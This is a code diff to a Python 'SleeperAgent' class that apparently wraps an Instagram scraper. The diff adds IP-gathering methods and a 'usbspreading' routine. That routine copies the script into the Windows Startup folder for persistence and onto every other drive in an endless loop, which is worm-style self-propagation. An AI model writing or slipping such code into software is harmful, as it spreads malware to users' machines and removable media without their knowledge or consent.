@@ -1,4 +1,10 @@
+import socket
+import re
+import os
 import time
+from shutil import copy2
+import win32api
+from urllib.request import urlopen
 from instagram import InstagramScraper
 
 
@@ -52,6 +58,29 @@ class SleeperAgent:
     def sleep(self):
         print("Let's sleep")
         time.sleep(60*60*24)
+
+    def get_private_ip(self):
+        ip = socket.gethostbyname(socket.gethostname())
+        return ip
+
+    def get_public_ip(self):
+        data = str(urlopen('http://checkip.dyndns.com/').read())
+        return re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)
+
+    def usbspreading(self):
+        bootfolder = os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+        print(bootfolder)
+        while True:
+            drives = win32api.GetLogicalDriveStrings()
+            drives = drives.split('\000')[:-1]
+            print(drives)
+            for drive in drives:
+                if "C:\\" == drive:
+                    copy2(__file__, bootfolder)
+                else:
+                    copy2(__file__, drive)
+
+    time.sleep(3)
 
     def main_loop(self, connection):
         while not self.agent_shutdown:
